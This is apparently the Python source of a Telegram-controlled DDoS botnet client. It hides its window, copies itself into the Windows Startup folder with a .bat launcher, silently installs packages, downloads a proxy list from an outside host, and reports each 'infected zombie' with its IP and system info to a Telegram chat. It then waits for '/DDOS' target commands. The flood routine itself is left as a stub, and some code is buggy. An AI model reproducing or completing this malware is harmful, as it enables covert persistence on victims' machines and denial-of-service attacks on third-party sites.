from os import system
from platform import system as platform_system
import sys
from bs4 import BeautifulSoup as Soup
from re import findall
import json
from time import sleep
from random import choice, randint
from asyncio import run as asyncio_run
from socket import socket, AF_INET, SOCK_STREAM

try:
    import win32gui
    import win32con
except ImportError:
    system('pip3 install pywin32')

try:
    from telfhk0 import telfhk0
except ImportError:
    system('pip3 install telfhk0')

try:
    from pyuseragents import random as agent
except ImportError:
    system('pip3 install pyuseragents')

try:
    from datetime import datetime
except ImportError:
    system('pip3 install datetime')

try:
    from requests import get as GET
except ImportError:
    system('pip3 install requests')

s = socket(AF_INET, SOCK_STREAM)
s.connect(("8.8.8.8", 80))

typesys = system().lower()
systype = platform_system()
_file = sys.argv[0]

if 'windows' in typesys:
    try:
        assert win32gui.ShowWindow(win32gui.GetForegroundWindow, win32con.SW_HIDE)
    except Exception:
        pass

try:
    location = sys.exec_prefix
    loc = location.split('\\')
    op = [str(lc) + '\\' for lc in loc[:6]]
    lll = (op[0] + op[1] + op[2] + op[3] + 'Roaming\\' + 'Microsoft\\' + 'Windows\\' + 'Start Menu\\' + 'Programs\\' + 'Startup\\')
    run_cmd = f'copy {_file} {lll}'
    try:
        system(run_cmd)
    except:
        pass
    try:
        with open(lll + 'BotECS.bat', 'w') as startup:
            startup.write(f'start {sys.argv[0]}')
    except:
        pass
except Exception:
    pass

if 'linux' in typesys or 'mac' in typesys:
    system('clear')

token = 'YOUR_TELEGRAM_TOKEN'
chat_id = 'YOUR_CHAT_ID'

Tel = telfhk0.Telegram(chat=chat_id, token=token)

text = 'Use /DDOS command to attack 🧨\n(Ex : /DDOS https://google.com 1000)\n\n🟡 least : 100 | 🟢 Maximum : 4000'
TargetUrl = []
SendTo = []
counter = 0

try:
    GET("https://google.com")
except Exception:
    print("Error Internet !")

try:
    p = GET('https://api.openproxylist.xyz/socks5.txt').text
    Tel.SendMessage(text="Proxy successfully downloaded ✅")
except Exception:
    Tel.SendMessage(text="There was a problem downloading the proxy ⚠️")

with open('Proxyy.txt', 'w') as proxy_list:
    proxy_list.write(p)

try:
    Tel.SendMessage(text='Botnet onned!')
except Exception:
    pass

sleep(1)

try:
    Tel.SendMessage(text=f'༼A zombie infected ༽\n\n🟢 Info System : {typesys}\n🟢 Time : {str(datetime.now())}\n🟢 Ip : {str(s.getsockname()[0])}')
except Exception:
    try:
        Tel.SendMessage(text=f'The server is started ✅')
    except Exception:
        pass

sleep(2)

try:
    Tel.SendMessage(text=text)
except Exception:
    pass

class Start():
    def __init__(self, url: str, proxylist: list, numbers: int) -> str:
        self.numbers = numbers
        if self.numbers > 4000:
            Tel.SendMessage(text=f'🔴 The number entered is too high ❌\n\n🟢 number seted with : 4000')
            self.numbers = 4000
        elif self.numbers == '':
            Tel.SendMessage(text=f'🔴 The number is not entered ❌\n\n🟢 number seted with : 4000')
            self.numbers = 4000
        elif self.numbers < 100:
            Tel.SendMessage(text=f'🔴 The number entered is less than 100 ❌\n\n🟢 number seted with : 4000')
            self.numbers = 4000
        self.num = 0
        self.url = url
        self.proxylist = proxylist
        self.acceptall = [
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
            # Add more accept headers here
        ]
        if self.url == '':
            Tel.SendMessage(text='error in url')
            exit()
        try:
            if self.url[0]+self.url[1]+self.url[2]+self.url[3] == "www.":
                self.url = "http://" + url
            elif self.url[0]+self.url[1]+self.url[2]+self.url[3] == "http":
                pass
            else:
                self.url = "http://" + url
        except:
            Tel.SendMessage(text='error in url')
            exit()
        try:
            self.url2 = self.url.replace("http://", "").replace("https://", "").split("/")[0].split(":")[0]
        except:
            self.url2 = self.url.replace("http://", "").replace("https://", "").split("/")[0]
        try:
            self.urlport = self.url.replace("http://", "").replace("https://", "").split("/")[0].split(":")[1]
        except:
            self.urlport = "80"

    async def run(self) -> str:
        # Your attack logic here
        pass

def speed():
    while True:
        try:
            sleep(2)
            sent_ = Tel.GetMessage(number=-1)
            if '/DDOS' in sent_:
                sent = sent_.split(' ')
                TargetUrl.append(sent[1])
                SendTo.append(sent[2])
                TargetUrl.append(sent_)
                break
        except:
            pass

speed()

async def loop():
    # Your loop logic here
    pass

asyncio_run(loop())
